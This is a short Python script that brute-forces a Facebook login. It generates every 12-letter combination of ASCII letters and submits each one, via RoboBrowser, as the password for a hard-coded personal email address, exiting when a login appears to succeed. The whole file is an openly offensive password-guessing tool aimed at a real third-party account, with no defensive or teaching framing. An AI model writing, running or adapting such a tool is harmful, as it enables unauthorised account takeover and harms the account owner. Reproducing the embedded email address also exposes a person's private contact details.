from robobrowser import RoboBrowser
from string import *
import sys

characters=uppercase+lowercase

def passG(j,password) :
    if j==12 :
          print ("trying with "+password)
          trying(password)
          return

    for ch in characters :
        passG(int(j)+1,password+ch)


def trying(password):
    browser=RoboBrowser(history=False)
    browser.open("https://www.facebook.com/")

    s_form=browser.get_form(id='login_form')

    s_form["email"].value='akashdrmc13596@gmail.com'
    s_form["pass"].value = password

    browser.submit_form(s_form)
    if 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110' not in str(browser.parsed) :
        print ("Got it : "+password)
        sys.exit()
        
    browser.back


passG(0,"")
